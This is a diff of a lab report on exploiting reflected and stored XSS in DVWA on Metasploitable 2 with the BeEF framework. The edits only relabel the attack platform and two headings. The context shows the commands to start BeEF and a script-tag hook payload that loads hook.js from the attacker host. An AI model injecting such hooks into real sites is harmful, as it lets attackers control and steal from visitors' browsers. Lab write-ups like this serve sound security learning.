@@ -15,7 +15,7 @@ Successfully identified and exploited both Reflected and Stored XSS vulnerabilit
 | Component | Details |
 |-----------|---------|
 | **Target System** | Metasploitable 2 (192.168.56.101) |
-| **Attack Platform** | Kali Linux (192.168.56.102) |
+| **Attack Platform** | Parrot Security OS (192.168.56.102) |
 | **Target Application** | DVWA v1.10 |
 | **Security Level** | LOW (Learning Environment) |
 | **Exploitation Framework** | BeEF (Browser Exploitation Framework) |
@@ -86,7 +86,7 @@ The stored XSS module features a guestbook with persistent storage of unfiltered
 
 ### Framework Setup
 
-**BeEF Initialization:**
+**BeEF Initialization (Attack Machine):**
 ```bash
 cd /usr/share/beef-xss/
 sudo ./beef
@@ -97,7 +97,7 @@ sudo ./beef
 
 ### Reflected XSS Weaponization - SUCCESS
 
-**Hook Payload:**
+**Hook Payload (Victim):**
 ```javascript
 <script src="http://192.168.56.102:3000/hook.js"></script>
 ```
